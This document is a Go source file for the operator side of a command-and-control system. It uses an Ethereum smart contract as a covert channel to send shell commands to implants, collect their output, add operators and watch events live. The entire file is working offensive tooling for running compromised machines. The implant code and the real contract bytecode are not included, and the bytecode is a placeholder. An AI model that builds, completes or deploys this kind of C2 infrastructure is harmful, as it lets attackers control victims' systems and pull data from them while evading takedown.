// Command server is the operator-side tool for deploying the contract and
// issuing commands to implants via the blockchain.
package main

import (
	"context"
	"encoding/hex"
	"fmt"
	"math/big"
	"os"
	"strings"
	"time"

	"github.com/ethereum/go-ethereum"
	"github.com/ethereum/go-ethereum/accounts/abi"
	"github.com/ethereum/go-ethereum/accounts/abi/bind"
	"github.com/ethereum/go-ethereum/common"
	"github.com/ethereum/go-ethereum/core/types"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/ethereum/go-ethereum/ethclient"
)

// ------------------
// Embedded ABI — replace with `forge inspect C2Controller abi` output
// ------------------

const contractABIJSON = `[
	{"inputs":[{"internalType":"address","name":"initialOperator","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},
	{"anonymous":false,"inputs":[{"indexed":true,"internalType":"bytes32","name":"implantId","type":"bytes32"},{"indexed":true,"internalType":"bytes32","name":"commandId","type":"bytes32"},{"indexed":false,"internalType":"string","name":"command","type":"string"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"CommandIssued","type":"event"},
	{"anonymous":false,"inputs":[{"indexed":true,"internalType":"bytes32","name":"implantId","type":"bytes32"},{"indexed":true,"internalType":"bytes32","name":"commandId","type":"bytes32"},{"indexed":true,"internalType":"bytes32","name":"resultId","type":"bytes32"},{"indexed":false,"internalType":"string","name":"result","type":"string"},{"indexed":false,"internalType":"uint256","name":"timestamp","type":"uint256"}],"name":"ResultSubmitted","type":"event"},
	{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"active","type":"bool"}],"name":"OperatorUpdated","type":"event"},
	{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},
	{"inputs":[{"internalType":"bytes32","name":"implantId","type":"bytes32"},{"internalType":"bytes32","name":"commandId","type":"bytes32"}],"name":"ackCommand","outputs":[],"stateMutability":"nonpayable","type":"function"},
	{"inputs":[{"internalType":"bytes32","name":"","type":"bytes32"},{"internalType":"bytes32","name":"","type":"bytes32"}],"name":"commands","outputs":[{"internalType":"string","name":"data","type":"string"},{"internalType":"bool","name":"active","type":"bool"}],"stateMutability":"view","type":"function"},
	{"inputs":[{"internalType":"bytes32","name":"implantId","type":"bytes32"}],"name":"getActiveCommands","outputs":[{"internalType":"bytes32[]","name":"","type":"bytes32[]"}],"stateMutability":"view","type":"function"},
	{"inputs":[{"internalType":"bytes32","name":"implantId","type":"bytes32"},{"internalType":"bytes32","name":"commandId","type":"bytes32"}],"name":"getCommand","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
	{"inputs":[{"internalType":"bytes32","name":"implantId","type":"bytes32"}],"name":"getLatestCommand","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
	{"inputs":[{"internalType":"bytes32","name":"resultId","type":"bytes32"}],"name":"getResult","outputs":[{"internalType":"string","name":"data","type":"string"},{"internalType":"uint256","name":"timestamp","type":"uint256"},{"internalType":"bytes32","name":"commandId","type":"bytes32"}],"stateMutability":"view","type":"function"},
	{"inputs":[{"internalType":"bytes32","name":"implantId","type":"bytes32"},{"internalType":"string","name":"command","type":"string"}],"name":"issueCommand","outputs":[],"stateMutability":"nonpayable","type":"function"},
	{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"operators","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},
	{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},
	{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},
	{"inputs":[],"name":"resultCount","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
	{"inputs":[{"internalType":"uint256","name":"idx","type":"uint256"}],"name":"resultIdAtIndex","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},
	{"inputs":[{"internalType":"address","name":"op","type":"address"},{"internalType":"bool","name":"active","type":"bool"}],"name":"setOperator","outputs":[],"stateMutability":"nonpayable","type":"function"},
	{"inputs":[{"internalType":"bytes32","name":"implantId","type":"bytes32"},{"internalType":"bytes32","name":"commandId","type":"bytes32"},{"internalType":"string","name":"result","type":"string"}],"name":"submitResult","outputs":[],"stateMutability":"nonpayable","type":"function"},
	{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}
]`

// Placeholder — replace with actual deployed bytecode hex from compile
// Run: solc --bin C2Controller.sol  or  forge build && cat out/C2Controller.sol/C2Controller.json | jq -r '.bytecode.object'
const contractBytecode = "0x608060..." // REPLACE ME

// ──────────────────────────────────────────────
//  CLI
// ──────────────────────────────────────────────

func main() {
	if len(os.Args) < 2 {
		printUsage()
		os.Exit(1)
	}

	switch os.Args[1] {
	case "deploy":
		cmdDeploy(os.Args[2:])
	case "exec":
		cmdExec(os.Args[2:])
	case "results":
		cmdResults(os.Args[2:])
	case "add-op":
		cmdAddOp(os.Args[2:])
	case "watch":
		cmdWatch(os.Args[2:])
	default:
		fmt.Fprintf(os.Stderr, "Unknown command: %s\n\n", os.Args[1])
		printUsage()
		os.Exit(1)
	}
}

func printUsage() {
	fmt.Println(`Usage:
  server deploy <rpc-url> <private-key-hex> [initial-operator-address]
  server exec   <rpc-url> <private-key-hex> <contract-addr> <implant-id-hex> <command>
  server results <rpc-url> <contract-addr> [--limit N]
  server add-op <rpc-url> <private-key-hex> <contract-addr> <operator-address>
  server watch  <rpc-url> <contract-addr> [--implant <implant-id-hex>]

Flags:
  --limit <N>     Limit results shown (default 20)
  --implant <hex> Filter events by implant ID

Environment:
  PRIVATE_KEY    Hex private key (alternative to CLI arg)
  ETH_RPC_URL    RPC URL (alternative to CLI arg)
  CONTRACT_ADDR  Contract address (alternative to CLI arg)

Examples:
  server deploy https://sepolia.infura.io/v3/YOUR_KEY 0xabc123...
  server exec   https://sepolia.infura.io/v3/YOUR_KEY 0xabc123... 0xDeAd... 0011 "whoami"
  server results https://sepolia.infura.io/v3/YOUR_KEY 0xDeAd...
  server watch  https://sepolia.infura.io/v3/YOUR_KEY 0xDeAd...`)
}

func parseCommonFlags(args []string) ([]string, *uint64) {
	var limit *uint64
	var filtered []string
	for i := 0; i < len(args); i++ {
		if args[i] == "--limit" && i+1 < len(args) {
			i++
			v := uint64(0)
			if _, err := fmt.Sscanf(args[i], "%d", &v); err == nil {
				limit = &v
			}
		} else {
			filtered = append(filtered, args[i])
		}
	}
	return filtered, limit
}

// ──────────────────────────────────────────────
//  connect / wallet helpers
// ──────────────────────────────────────────────

func rpcAndWallet(rpcURL, pkHex string) (*ethclient.Client, *bind.TransactOpts, error) {
	client, err := ethclient.Dial(rpcURL)
	if err != nil {
		return nil, nil, fmt.Errorf("dial: %w", err)
	}
	privateKey, err := crypto.HexToECDSA(strings.TrimPrefix(pkHex, "0x"))
	if err != nil {
		return nil, nil, fmt.Errorf("private key: %w", err)
	}
	chainID, err := client.NetworkID(nil)
	if err != nil {
		return nil, nil, fmt.Errorf("chain ID: %w", err)
	}
	auth, err := bind.NewKeyedTransactorWithChainID(privateKey, chainID)
	if err != nil {
		return nil, nil, fmt.Errorf("transactor: %w", err)
	}
	return client, auth, nil
}

func getEnvOrDefault(envKey, def string) string {
	if v := os.Getenv(envKey); v != "" {
		return v
	}
	return def
}

func bytes32FromHex(s string) ([32]byte, error) {
	var out [32]byte
	b, err := hex.DecodeString(strings.TrimPrefix(s, "0x"))
	if err != nil {
		return out, err
	}
	if len(b) != 32 {
		return out, fmt.Errorf("expected 32 bytes, got %d", len(b))
	}
	copy(out[:], b)
	return out, nil
}

// ──────────────────────────────────────────────
//  ABI helpers
// ──────────────────────────────────────────────

func mustParseABI() abi.ABI {
	a, err := abi.JSON(strings.NewReader(contractABIJSON))
	if err != nil {
		panic(fmt.Sprintf("ABI parse error: %v", err))
	}
	return a
}

func contractCall(client *ethclient.Client, to common.Address, data []byte) ([]byte, error) {
	return client.CallContract(nil, ethereum.CallMsg{To: &to, Data: data}, nil)
}

func sendTx(client *ethclient.Client, auth *bind.TransactOpts, to common.Address, data []byte, gas uint64) (*types.Transaction, error) {
	gasPrice, err := client.SuggestGasPrice(nil)
	if err != nil {
		return nil, fmt.Errorf("suggestGasPrice: %w", err)
	}
	gasPrice = new(big.Int).Mul(gasPrice, big.NewInt(12))
	gasPrice = new(big.Int).Div(gasPrice, big.NewInt(10))

	nonce, err := client.PendingNonceAt(nil, auth.From)
	if err != nil {
		return nil, fmt.Errorf("nonce: %w", err)
	}

	tx := types.NewTransaction(nonce, to, big.NewInt(0), gas, gasPrice, data)
	signedTx, err := auth.Signer(auth.From, tx)
	if err != nil {
		return nil, fmt.Errorf("sign: %w", err)
	}
	if err := client.SendTransaction(nil, signedTx); err != nil {
		return nil, fmt.Errorf("send: %w", err)
	}
	return signedTx, nil
}

// ──────────────────────────────────────────────
//  Subcommand: deploy
// ──────────────────────────────────────────────

func cmdDeploy(args []string) {
	if len(args) < 2 {
		fmt.Fprintln(os.Stderr, "Usage: server deploy <rpc-url> <private-key-hex> [initial-operator-address]")
		os.Exit(1)
	}
	rpcURL := args[0]
	pkHex := args[1]
	initOp := common.Address{}
	if len(args) > 2 {
		initOp = common.HexToAddress(args[2])
	}

	client, auth, err := rpcAndWallet(rpcURL, pkHex)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}

	parsedABI := mustParseABI()

	ctorArgs, err := parsedABI.Pack("", initOp)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Constructor arg encode error: %v\n", err)
		os.Exit(1)
	}

	data := append(common.FromHex(contractBytecode), ctorArgs...)

	gasPrice, err := client.SuggestGasPrice(nil)
	if err != nil {
		fmt.Fprintf(os.Stderr, "SuggestGasPrice: %v\n", err)
		os.Exit(1)
	}
	gasPrice = new(big.Int).Mul(gasPrice, big.NewInt(12))
	gasPrice = new(big.Int).Div(gasPrice, big.NewInt(10))

	nonce, err := client.PendingNonceAt(nil, auth.From)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Nonce: %v\n", err)
		os.Exit(1)
	}

	tx := types.NewContractCreation(nonce, big.NewInt(0), 3000000, gasPrice, data)
	signedTx, err := auth.Signer(auth.From, tx)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Sign error: %v\n", err)
		os.Exit(1)
	}
	if err := client.SendTransaction(nil, signedTx); err != nil {
		fmt.Fprintf(os.Stderr, "Send error: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Deploy tx sent: %s\n", signedTx.Hash().Hex())
	fmt.Println("Waiting for receipt...")

	receipt, err := bind.WaitMined(nil, client, signedTx)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Wait error: %v\n", err)
		os.Exit(1)
	}
	if receipt.Status == 0 {
		fmt.Fprintln(os.Stderr, "Deploy failed (reverted). Check your contract or gas.")
		os.Exit(1)
	}

	fmt.Printf("Contract deployed at: %s\n", receipt.ContractAddress.Hex())
	fmt.Printf("Tx hash:             %s\n", receipt.TxHash.Hex())
	fmt.Printf("Block:               %d\n", receipt.BlockNumber)
}

// ──────────────────────────────────────────────
//  Subcommand: exec (issue a command)
// ──────────────────────────────────────────────

func cmdExec(args []string) {
	if len(args) < 5 {
		fmt.Fprintln(os.Stderr, "Usage: server exec <rpc-url> <private-key-hex> <contract-addr> <implant-id-hex> <command>")
		os.Exit(1)
	}
	rpcURL := args[0]
	pkHex := args[1]
	contractAddr := common.HexToAddress(args[2])
	implantHex := args[3]
	commandStr := args[4]

	implantID, err := bytes32FromHex(implantHex)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Bad implant ID: %v\n", err)
		os.Exit(1)
	}

	client, auth, err := rpcAndWallet(rpcURL, pkHex)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}

	parsedABI := mustParseABI()
	data, err := parsedABI.Pack("issueCommand", implantID, commandStr)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Pack error: %v\n", err)
		os.Exit(1)
	}

	tx, err := sendTx(client, auth, contractAddr, data, 200000)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Command issued. Tx: %s\n", tx.Hash().Hex())
	fmt.Printf("Implant ID:  0x%x\n", implantID)

	// Compute command ID (matching contract's keccak256(implantId, command, block.timestamp))
	// Since block.timestamp is unknown client-side, the operator should note the tx hash
	// and use `server results` to see the result appear.
	fmt.Println("Use `server results <rpc> <contract>` to see results.")
}

// ──────────────────────────────────────────────
//  Subcommand: results
// ──────────────────────────────────────────────

func cmdResults(args []string) {
	args, limit := parseCommonFlags(args)

	if len(args) < 2 {
		fmt.Fprintln(os.Stderr, "Usage: server results <rpc-url> <contract-addr> [--limit N]")
		os.Exit(1)
	}
	rpcURL := args[0]
	contractAddr := common.HexToAddress(args[1])

	client, err := ethclient.Dial(rpcURL)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Dial: %v\n", err)
		os.Exit(1)
	}

	parsedABI := mustParseABI()

	// resultCount()
	data, _ := parsedABI.Pack("resultCount")
	resp, err := contractCall(client, contractAddr, data)
	if err != nil {
		fmt.Fprintf(os.Stderr, "resultCount: %v\n", err)
		os.Exit(1)
	}
	count := new(big.Int).SetBytes(resp).Uint64()

	maxResults := count
	if limit != nil && *limit < maxResults {
		maxResults = *limit
	}

	fmt.Printf("Total results: %d\n\n", count)

	for i := count; i > count-maxResults && i > 0; i-- {
		idx := i - 1

		ridData, _ := parsedABI.Pack("resultIdAtIndex", new(big.Int).SetUint64(idx))
		ridResp, err := contractCall(client, contractAddr, ridData)
		if err != nil {
			continue
		}
		var resultID [32]byte
		copy(resultID[:], ridResp)

		rData, _ := parsedABI.Pack("getResult", resultID)
		rResp, err := contractCall(client, contractAddr, rData)
		if err != nil {
			continue
		}

		type Result struct {
			Data      string   `json:"data"`
			Timestamp *big.Int `json:"timestamp"`
			CommandID [32]byte `json:"commandId"`
		}
		var res Result
		if err := parsedABI.UnpackIntoInterface(&res, "getResult", rResp); err != nil {
			continue
		}
		t := time.Unix(res.Timestamp.Int64(), 0)

		fmt.Printf("[%d] Result ID: 0x%x\n", idx, resultID)
		fmt.Printf("    Command:   0x%x\n", res.CommandID)
		fmt.Printf("    Time:      %s\n", t.Format(time.RFC3339))
		fmt.Printf("    Output:    %s\n", truncate(res.Data, 200))
		fmt.Println()
	}
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}

// ──────────────────────────────────────────────
//  Subcommand: add-op
// ──────────────────────────────────────────────

func cmdAddOp(args []string) {
	if len(args) < 4 {
		fmt.Fprintln(os.Stderr, "Usage: server add-op <rpc-url> <private-key-hex> <contract-addr> <operator-address>")
		os.Exit(1)
	}
	rpcURL := args[0]
	pkHex := args[1]
	contractAddr := common.HexToAddress(args[2])
	opAddr := common.HexToAddress(args[3])

	client, auth, err := rpcAndWallet(rpcURL, pkHex)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}

	parsedABI := mustParseABI()
	data, err := parsedABI.Pack("setOperator", opAddr, true)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Pack error: %v\n", err)
		os.Exit(1)
	}

	tx, err := sendTx(client, auth, contractAddr, data, 100000)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Operator %s added. Tx: %s\n", opAddr.Hex(), tx.Hash().Hex())
}

// ──────────────────────────────────────────────
//  Subcommand: watch
// ──────────────────────────────────────────────

func cmdWatch(args []string) {
	args, _ = parseCommonFlags(args)

	rpcURL := ""
	contractAddr := common.Address{}
	var filterImplant *[32]byte

	if len(args) >= 2 {
		rpcURL = args[0]
		contractAddr = common.HexToAddress(args[1])
	}
	for i := 0; i < len(args); i++ {
		if args[i] == "--implant" && i+1 < len(args) {
			i++
			hid, err := bytes32FromHex(args[i])
			if err == nil {
				filterImplant = &hid
			}
		}
	}

	if rpcURL == "" {
		rpcURL = getEnvOrDefault("ETH_RPC_URL", "")
	}
	if rpcURL == "" {
		fmt.Fprintln(os.Stderr, "RPC URL required (arg or ETH_RPC_URL)")
		os.Exit(1)
	}
	if contractAddr == (common.Address{}) {
		c := getEnvOrDefault("CONTRACT_ADDR", "")
		if c == "" {
			fmt.Fprintln(os.Stderr, "Contract address required (arg or CONTRACT_ADDR)")
			os.Exit(1)
		}
		contractAddr = common.HexToAddress(c)
	}

	client, err := ethclient.Dial(rpcURL)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Dial: %v\n", err)
		os.Exit(1)
	}

	parsedABI := mustParseABI()

	cmdIssuedSig := crypto.Keccak256Hash([]byte("CommandIssued(bytes32,bytes32,string,uint256)"))
	resultSubSig := crypto.Keccak256Hash([]byte("ResultSubmitted(bytes32,bytes32,bytes32,string,uint256)"))

	fmt.Printf("Watching contract %s on %s...\n", contractAddr.Hex(), rpcURL)
	fmt.Println("Press Ctrl+C to stop.\n")

	var lastBlock uint64
	for {
		header, err := client.HeaderByNumber(context.Background(), nil)
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}

		currentBlock := header.Number.Uint64()
		if currentBlock <= lastBlock {
			time.Sleep(3 * time.Second)
			continue
		}
		fromBlock := lastBlock
		if fromBlock == 0 {
			fromBlock = currentBlock
		}
		lastBlock = currentBlock

		logs, err := client.FilterLogs(nil, ethereum.FilterQuery{
			FromBlock: new(big.Int).SetUint64(fromBlock),
			ToBlock:   new(big.Int).SetUint64(currentBlock),
			Addresses: []common.Address{contractAddr},
		})
		if err != nil {
			time.Sleep(3 * time.Second)
			continue
		}

		for _, vLog := range logs {
			switch vLog.Topics[0] {
			case cmdIssuedSig:
				if len(vLog.Topics) < 3 {
					continue
				}
				var implantID [32]byte
				copy(implantID[:], vLog.Topics[1].Bytes())
				if filterImplant != nil && implantID != *filterImplant {
					continue
				}

				type CmdEvent struct {
					Command   string   `json:"0"`
					Timestamp *big.Int `json:"1"`
				}
				var ev CmdEvent
				if err := parsedABI.UnpackIntoInterface(&ev, "CommandIssued", vLog.Data); err == nil {
					t := time.Unix(ev.Timestamp.Int64(), 0)
					fmt.Printf("[CMD]  implant=0x%x at %s\n", implantID, t.Format(time.RFC3339))
					fmt.Printf("      command: %s\n", truncate(ev.Command, 120))
				}

			case resultSubSig:
				if len(vLog.Topics) < 4 {
					continue
				}
				var implantID [32]byte
				copy(implantID[:], vLog.Topics[1].Bytes())
				if filterImplant != nil && implantID != *filterImplant {
					continue
				}

				type ResEvent struct {
					Result    string   `json:"0"`
					Timestamp *big.Int `json:"1"`
				}
				var ev ResEvent
				if err := parsedABI.UnpackIntoInterface(&ev, "ResultSubmitted", vLog.Data); err == nil {
					t := time.Unix(ev.Timestamp.Int64(), 0)
					fmt.Printf("[RES]  implant=0x%x at %s\n", implantID, t.Format(time.RFC3339))
					fmt.Printf("      output: %s\n", truncate(ev.Result, 120))
				}
			}
		}

		time.Sleep(3 * time.Second)
	}
}
